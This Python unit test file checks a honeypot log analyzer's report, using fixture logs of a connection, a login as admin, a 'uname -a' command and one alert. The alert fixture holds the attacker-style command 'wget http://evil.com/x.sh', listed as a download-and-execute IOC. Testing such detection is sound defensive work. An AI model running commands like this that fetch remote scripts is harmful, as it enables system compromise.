"""Unit tests for JSON log parser and analyzer"""

import json
import tempfile
from pathlib import Path
import pytest
from analyzer.analyzer import HoneypotLogAnalyzer


def test_analyzer_parsing():
    with tempfile.TemporaryDirectory() as tmpdir:
        log_path = Path(tmpdir) / "audits.jsonl"
        cmd_path = Path(tmpdir) / "cmd_audits.jsonl"
        alert_path = Path(tmpdir) / "alerts.jsonl"

        with open(log_path, "w", encoding="utf-8") as f:
            f.write(json.dumps({
                "timestamp": "2026-09-23T12:00:00+00:00",
                "event": "connection",
                "src_ip": "1.2.3.4",
                "src_port": 54321
            }) + "\n")
            f.write(json.dumps({
                "timestamp": "2026-09-23T12:00:01+00:00",
                "event": "auth",
                "src_ip": "1.2.3.4",
                "username": "admin",
                "password": "123",
                "auth_success": True
            }) + "\n")

        with open(cmd_path, "w", encoding="utf-8") as f:
            f.write(json.dumps({
                "timestamp": "2026-09-23T12:00:05+00:00",
                "event": "command",
                "src_ip": "1.2.3.4",
                "username": "admin",
                "command": "uname -a"
            }) + "\n")

        with open(alert_path, "w", encoding="utf-8") as f:
            f.write(json.dumps({
                "timestamp": "2026-09-23T12:00:06+00:00",
                "event": "alert",
                "src_ip": "1.2.3.4",
                "username": "admin",
                "severity": "HIGH",
                "category": "download_execute",
                "mitre_attack": ["T1105"],
                "command": "wget http://evil.com/x.sh",
                "iocs": {"urls": ["http://evil.com/x.sh"]}
            }) + "\n")

        analyzer = HoneypotLogAnalyzer(log_dir=tmpdir)
        report = analyzer.generate_full_report(time_range_hours=24)

        assert report["overview"]["total_connections"] == 1
        assert report["overview"]["unique_ips"] == 1
        assert report["overview"]["total_commands"] == 1
        assert report["overview"]["alerts_triggered"] == 1
        assert report["credentials"]["top_usernames"][0]["username"] == "admin"
        assert report["attacks"]["mitre_attack_counts"][0]["technique"] == "T1105"
        assert report["iocs"]["urls"][0]["url"] == "http://evil.com/x.sh"
